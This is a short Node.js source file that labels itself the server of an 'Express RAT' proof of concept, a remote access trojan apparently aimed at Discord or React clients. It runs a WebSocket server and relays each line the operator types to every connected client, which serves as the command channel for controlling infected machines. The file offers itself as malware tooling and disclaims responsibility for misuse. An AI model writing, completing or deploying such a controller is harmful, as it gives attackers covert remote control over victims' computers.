console.log('This application is meant as a PROOF OF CONCEPT! I am not responsible for any misuse of this application.  Express RAT proof of concept by https://github.com/iiDk-the-actual/POC.DiscordReactRAT');

const WebSocket = require('ws');
const readline = require('readline');

const wss = new WebSocket.Server({ port: 2474 });

console.log('WebSocket server running on ws://localhost:2474');

let clients = [];

wss.on('connection', (ws) => {
    console.log('New client connected');
    clients.push(ws);

    ws.on('close', () => {
        console.log('Client disconnected');
        clients = clients.filter(client => client !== ws);
    });
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.on('line', (input) => {
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(input);
        }
    });
});
